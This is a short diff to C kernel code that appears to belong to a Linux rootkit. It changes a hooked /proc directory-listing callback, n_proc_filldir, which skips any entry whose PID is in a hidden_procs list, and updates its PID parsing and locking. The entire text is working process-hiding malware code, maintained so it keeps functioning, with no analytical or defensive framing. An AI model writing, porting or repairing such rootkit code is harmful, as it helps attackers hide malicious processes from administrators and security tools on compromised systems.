@@ -174,18 +174,18 @@ int n_root_iterate ( struct file *file, void *dirent, filldir_t filldir )
 static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
 {
     struct hidden_proc *hp;
-    char *endp;
-    long pid;
+    int pid;
 
-    pid = simple_strtol(name, &endp, 10);
-    spin_lock(&hidden_procs_lock);
-    list_for_each_entry ( hp, &hidden_procs, list )
-    if ( pid == hp->pid )
-    {
+    if (kstrtoint(name, 10, &pid) == 0) {
+        spin_lock(&hidden_procs_lock);
+        list_for_each_entry ( hp, &hidden_procs, list )
+        if ( pid == hp->pid )
+        {
+            spin_unlock(&hidden_procs_lock);
+            return 0;
+        }
         spin_unlock(&hidden_procs_lock);
-        return 0;
     }
-    spin_unlock(&hidden_procs_lock);
 
     return proc_filldir(__buf, name, namelen, offset, ino, d_type);
 }
